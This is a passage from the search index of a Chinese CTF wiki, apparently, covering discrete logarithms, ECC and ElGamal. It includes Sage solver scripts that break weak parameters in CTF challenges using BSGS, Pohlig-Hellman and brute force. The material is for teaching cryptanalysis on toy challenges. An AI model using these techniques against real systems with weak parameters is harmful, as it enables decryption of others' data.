<p>\u4e0a\u8ff0\u8fc7\u7a0b\u53ef\u7528\u4e0b\u56fe\u7b80\u5355\u63cf\u8ff0\uff1a</p> <p> </p> <p>\u5176\u590d\u6742\u5ea6\u4e3aO\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right)\uff0c\u53ef\u4ee5\u770b\u51fa\u590d\u6742\u5ea6\u8fd8\u662f\u5f88\u4f4e\u7684\u3002</p> <p>\u4f46\u5f53 n \u4e3a\u7d20\u6570\uff0cm=2n+1\uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u548c O(\\sqrt m) \u662f\u51e0\u4e4e\u6ca1\u6709\u5dee\u522b\u7684\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#2018-ciscncrackme-java","title":"\u4f8b\u9898 [2018 ciscn]crackme java","text":"<p>\u4ee3\u7801\u5982\u4e0b</p> <pre><code>import java.math.BigInteger;\nimport java.util.Random;\n\npublic class Test1 {\nstatic BigInteger two =new BigInteger(\"2\");\nstatic BigInteger p = new BigInteger(\"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\");\nstatic BigInteger h= new BigInteger(\"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\");\n\n/*\n     Alice write the below algorithm for encryption.\n     The public key {p, h} is broadcasted to everyone.\n    @param val: The plaintext to encrypt.\n        We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length.\n    */\npublic static String pkEnc(String val){\nBigInteger[] ret = new BigInteger[2];\nBigInteger bVal=new BigInteger(val.toLowerCase(),36);\nBigInteger r =new BigInteger(new Random().nextInt()+\"\");\nret[0]=two.modPow(r,p);\nret[1]=h.modPow(r,p).multiply(bVal);\nreturn ret[0].toString(36)+\"==\"+ret[1].toString(36);\n}\n\n/* Alice write the below algorithm for decryption. x is her private key, which she will never let you know.\n    public static String skDec(String val,BigInteger x){\n        if(!val.contains(\"==\")){\n            return null;\n        }\n        else {\n            BigInteger val0=new BigInteger(val.split(\"==\")[0],36);\n            BigInteger val1=new BigInteger(val.split(\"==\")[1],36);\n            BigInteger s=val0.modPow(x,p).modInverse(p);\n            return val1.multiply(s).mod(p).toString(36);\n        }\n    }\n   */\n\npublic static void main(String[] args) throws Exception {\nSystem.out.println(\"You intercepted the following message, which is sent from Bob to Alice:\");\nBigInteger bVal1=new BigInteger(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\",36);\nBigInteger bVal2=new BigInteger(\"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\",36);\nBigInteger r =new BigInteger(new Random().nextInt()+\"\");\nSystem.out.println(r);\nSystem.out.println(bVal1);\nSystem.out.println(bVal2);\nSystem.out.println(\"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\");\nSystem.out.println(\"Please figure out the plaintext!\");\n}\n}\n</code></pre> <p>\u57fa\u672c\u529f\u80fd\u4e3a\u8ba1\u7b97</p> <p>r_0=2^r \\bmod p</p> <p>r_1 =b*h^r \\bmod p</p> <p>\u53ef\u4ee5\u53d1\u73b0\uff0cr \u7684\u8303\u56f4\u4e3a [0,2^{32})\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 BSGS \u7b97\u6cd5\uff0c\u5982\u4e0b</p> <pre><code>from sage.all import *\n\nc1 = int(\n    'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco',\n    36\n)\nc2 = int(\n    '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc',\n    36\n)\nprint c1, c2\np = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\nh = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\n# generate the group\nconst2 = 2\nconst2 = Mod(const2, p)\nc1 = Mod(c1, p)\nc2 = Mod(c2, p)\nh = Mod(h, p)\nprint '2', bsgs(const2, c1, bounds=(1, 2 ^ 32))\n\nr = 152351913\n\nnum = long(c2 / (h**r))\nprint num\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#picoctf-2017ecc2","title":"\u4f8b\u9898 [picoCTF 2017]ECC2","text":""},{"location":"crypto/asymmetric/discrete-log/discrete-log/#problem","title":"Problem","text":"<p>More elliptic curve cryptography fun for everyone! handout.txt (Yes, the flag will just be the number n.)</p> <p>txt\u6253\u4e0d\u5f00\u4e86\uff0c\u603b\u4e4b\u5c31\u662f\u8981\u6c42 Q = kP \u7684 k.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#hint","title":"Hint","text":"<p>Using SageMath (or something similar which supports working with elliptic curves) will be very helpful.</p> <pre><code>M = 93556643250795678718734474880013829509320385402690660619699653921022012489089\nA = 66001598144012865876674115570268990806314506711104521036747533612798434904785\nB = 25255205054024371783896605039267101837972419055969636393425590261926131199030\nP = (56027910981442853390816693056740903416379421186644480759538594137486160388926, 65533262933617146434438829354623658858649726233622196512439589744498050226926)\nQ = (61124499720410964164289905006830679547191538609778446060514645905829507254103, 2595146854028317060979753545310334521407008629091560515441729386088057610440)\n</code></pre> <p>\u9898\u76ee\u8fd8\u6709\u4e00\u90e8\u5206\u662f\u6c42<code>B</code>\u7684\uff0c\u6bd4\u8f83\u7b80\u5355\uff0c\u8fd9\u91cc\u76f4\u63a5\u8df3\u8fc7\u4e86</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#exp","title":"EXP","text":"<pre><code># sage\n# ECC\u4e0a\u5df2\u77e5P = kQ\uff0c\u6c42k\ndef Pohlig_Hellman(P, Q):\n    n = P.order()\n    factors = list(factor(n))\n    fac_pow = []\n    z = []\n    ki = []\n\n    for fac_tuple in factors:\n        P0 = (ZZ(n / fac_tuple[0])) * P\n        ki.append(0)\n        fac_pow.append(fac_tuple[0] ^ fac_tuple[1])\n        for i in range(fac_tuple[1]):\n            Qpart = Q\n            for j in range(1, i+1):\n                Qpart -= z[j-1] * (fac_tuple[0]^(j-1)) * P\n            Qi = (ZZ(n / (fac_tuple[0] ^ (i+1)))) * Qpart\n            z.insert(i, discrete_log(Qi, P0, operation='+'))\n            ki[-1] += z[i]*(fac_tuple[0]^i)\n        print(f\"ki = {ki}\")\n        print(f\"modulus = {fac_pow}\")\n        print(\"-\"*50)\n\n    return crt(ki, fac_pow)\n\n\nM = 93556643250795678718734474880013829509320385402690660619699653921022012489089\nA = 66001598144012865876674115570268990806314506711104521036747533612798434904785\nB = 25255205054024371783896605039267101837972419055969636393425590261926131199030\nP = (56027910981442853390816693056740903416379421186644480759538594137486160388926, 65533262933617146434438829354623658858649726233622196512439589744498050226926)\nQ = (61124499720410964164289905006830679547191538609778446060514645905829507254103, 2595146854028317060979753545310334521407008629091560515441729386088057610440)\n\nE = EllipticCurve(FiniteField(M), [A, B])\nP = E.point(P)\nQ = E.point(Q)\n\nprint(Pohlig_Hellman(P, Q))\n</code></pre> <p>\u8fd0\u884c\u540e\u53d1\u73b0\uff0c\u6700\u540e2\u4e2a\u8f83\u5927\u7684\u6570\u7684\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u6ca1\u6cd5\u5feb\u901f\u6c42\u89e3\u4e86\uff0c\u4f46\u662f\u4e4b\u524d\u7684\u8f93\u51fa\u7ed3\u679c\u8db3\u591f\u8ba9CRT\u89e3\u51fa\u7b54\u6848\u4e86.</p> <pre><code>sage: ki = [2, 1, 4, 1, 129, 224, 5729, 13993, 1730599, 4590572] \nsage: modulus = [4, 3, 5, 7, 137, 593, 24337, 25589, 3637793, 5733569]               \nsage: crt(ki, modulus)         \n\n152977126447386808276536247114\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_7","title":"\u53c2\u8003","text":"<ul> <li>\u521d\u7b49\u6570\u8bba\uff0c\u6f58\u627f\u6d1e\uff0c\u6f58\u627f\u5f6a</li> <li>https://ee.stanford.edu/~hellman/publications/28.pdf</li> <li>https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2</li> <li>https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html</li> </ul>"},{"location":"crypto/asymmetric/discrete-log/ecc/","title":"ECC","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_1","title":"\u6982\u8ff0","text":"<p>ECC \u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709</p> <ul> <li>\u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002</li> <li>\u7279\u5f81\u4e3a 2 \u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002</li> </ul>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_2","title":"\u57fa\u672c\u77e5\u8bc6","text":"<p>\u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f</p> <p>y^2+axy+by=x^3+cx^2+dx+e</p> <p>\u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002</p> <p>\u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b</p> <p>y^2=x^3+ax+b</p> <p>\u5176\u4e2d4a^3+27b^2 \\bmod p \\neq 0</p> <p>\u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c(x\\in Fp , y \\in Fp)\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002</p> <p>\u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6</p> <p>\u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97\\oplus \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbep\\in E(Fq) \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927</p> <p>p \\oplus p \\oplus ... \\oplus p=O</p> <p>\u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8eQ\\in E(Fq) \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49m=log_pq</p> <p>Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09</p> <p>\u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5E_q (a,b) \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3nG=O \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#eccelgamal","title":"ECC\u4e2d\u7684ElGamal","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_3","title":"\u5bc6\u94a5\u751f\u6210","text":"<p>\u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebfE_q (a,b) \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570n_a\u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97P_a=n_aG\u3002</p> <p>\u5176\u4e2d\uff0cE_q(a,b), q,G\u90fd\u4f1a\u88ab\u516c\u5f00\u3002</p> <p>\u516c\u94a5\u4e3aP_a\uff0c\u79c1\u94a5\u4e3a$n_a $\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_4","title":"\u52a0\u5bc6","text":"<p>\u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b</p> <ol> <li>\u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5E_q(a,b), q, P_a,G \u3002</li> <li>\u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002</li> <li>\u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9(x_1,y_1)=kG \u3002</li> <li>\u8ba1\u7b97\u70b9(x_2,y_2)=kP_a \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002</li> <li>\u8ba1\u7b97C=m+(x_2,y_2)</li> <li>\u5c06((x_1,y_1),C) \u53d1\u9001\u7ed9A\u3002</li> </ol>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_5","title":"\u89e3\u5bc6","text":"<p>\u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b</p> <ol> <li>\u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2)\u3002</li> <li>\u8ba1\u7b97\u6d88\u606fm=C-(x_2,y_2) \u3002</li> </ol>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_6","title":"\u5173\u952e\u70b9","text":"<p>\u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86(x_1,y_1) \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/ecc/#2013-seccon-ctf-quals-cryptanalysis","title":"2013 SECCON CTF quals Cryptanalysis","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis \u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b</p> <p></p> <p>\u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143 base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002</p> <p>\u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002</p> <p>\u8fd9\u91cc\u76f4\u63a5\u53c2\u8003 github\u4e0a\u7684 sage \u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fa secret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002</p> <pre><code>a = 1234577\nb = 3213242\nn = 7654319\n\nE = EllipticCurve(GF(n), [0, 0, 0, a, b])\n\nbase = E([5234568, 2287747])\npub = E([2366653, 1424308])\n\nc1 = E([5081741, 6744615])\nc2 = E([610619, 6218])\n\nX = base\n\nfor i in range(1, n):\n    if X == pub:\n        secret = i\n        print \"[+] secret:\", i\n        break\n    else:\n        X = X + base\n        print i\n\nm = c2 - (c1 * secret)\n\nprint \"[+] x:\", m[0]\nprint \"[+] y:\", m[1]\nprint \"[+] x+y:\", m[0] + m[1]\n</code></pre> <p>\u66b4\u529b\u8dd1\u51fa\u7ed3\u679c</p> <pre><code>[+] secret: 1584718\n[+] x: 2171002\n[+] y: 3549912\n[+] x+y: 5720914\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/ecc/#_7","title":"\u53c2\u8003","text":"<ul> <li>https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis</li> </ul>"},{"location":"crypto/asymmetric/discrete-log/elgamal/","title":"ElGamal","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_1","title":"\u6982\u8ff0","text":"<p>ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c\u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u6b64\u5916g\u662f Z_p^*  \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 y \\in Z_p^*  \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x(0\\leq x \\leq p-2) \uff0c\u6ee1\u8db3g^x \\equiv y \\bmod p \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3ax=log_gy \u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_2","title":"\u57fa\u672c\u539f\u7406","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_3","title":"\u5bc6\u94a5\u751f\u6210","text":"<p>\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b</p> <ol> <li>\u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002</li> <li>\u9009\u53d6Z_p^* \u7684\u751f\u6210\u5143g\u3002</li> <li>\u968f\u673a\u9009\u53d6\u6574\u6570k,0\\leq k \\leq p-2 \uff0c\u5e76\u8ba1\u7b97g^k \\equiv y \\bmod p \u3002</li> </ol> <p>\u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_4","title":"\u52a0\u5bc6","text":"<p>A\u9009\u53d6\u968f\u673a\u6570r \\in Z_{p-1} \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6E_k(m,r)=(y_1,y_2) \u3002\u5176\u4e2dy_1 \\equiv g^r \\bmod p \uff0cy_2 \\equiv my^r \\bmod p \u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_5","title":"\u89e3\u5bc6","text":"<p>D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_6","title":"\u96be\u70b9","text":"<p>\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2015-mma-ctf-alicegame","title":"2015 MMA CTF Alicegame","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015 \u4e2d\u7684 Alicegame \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2a m\uff0c\u7ed9\u4e00\u4e2a r \u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002</p> <p>\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86 pk \u4e0e sk</p> <pre><code>    (pk, sk) = genkey(PBITS)\n</code></pre> <p>\u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b</p> <pre><code>def genkey(k):\n    p = getPrime(k)\n    g = random.randrange(2, p)\n    x = random.randrange(1, p-1)\n    h = pow(g, x, p)\n    pk = (p, g, h)\n    sk = (p, x)\n    return (pk, sk)\n</code></pre> <p>p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86h \\equiv g^x \\bmod p \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002</p> <p>\u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6</p> <pre><code>def encrypt(pk, m, r = None):\n    (p, g, h) = pk\n    if r is None:\n        r = random.randrange(1, p-1)\n    c1 = pow(g, r, p)\n    c2 = (m * pow(h, r, p)) % p\n    return (c1, c2)\n</code></pre> <p>\u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002</p> <p>\u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002</p> <p>\u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14</p> <p>c_1 \\equiv g^r \\bmod p</p> <p>c_2 \\equiv m * h^{r} \\bmod p</p> <p>\u5982\u679c\u6211\u4eec\u8bbe\u7f6e</p> <ol> <li>r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97c_1=g,c_2=h \u3002</li> <li>r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97c_1=g, c_2 = p-h \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002</li> </ol> <p>\u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002</p> <p>\u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1discrete_log \u3002</p> 